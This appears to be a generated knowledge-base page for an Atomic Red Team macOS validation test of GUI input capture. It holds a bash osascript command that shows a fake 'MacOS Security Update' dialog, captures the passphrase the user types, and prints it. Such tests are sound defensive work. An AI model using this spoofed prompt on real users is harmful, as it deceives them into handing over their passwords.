---
atomic_guid: "b7037b89-947a-427a-ba29-e7e9f09bc045"
title: "AppleScript - Spoofing a credential prompt using osascript"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.002"
attack_technique_name: "Input Capture: GUI Input Capture"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml"
build_date: "2026-04-27 19:12:26"
executor: "bash"
aliases:
  - "b7037b89-947a-427a-ba29-e7e9f09bc045"
  - "AppleScript - Spoofing a credential prompt using osascript"
platforms:
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Prompt user for password without requiring permissions to send Apple events to System Settings.
https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture#^t1056002-gui-input-capture|T1056.002: GUI Input Capture]]

## Executor

- name: bash

### Command

```bash
PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')
echo $PWD_SPOOF
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml)
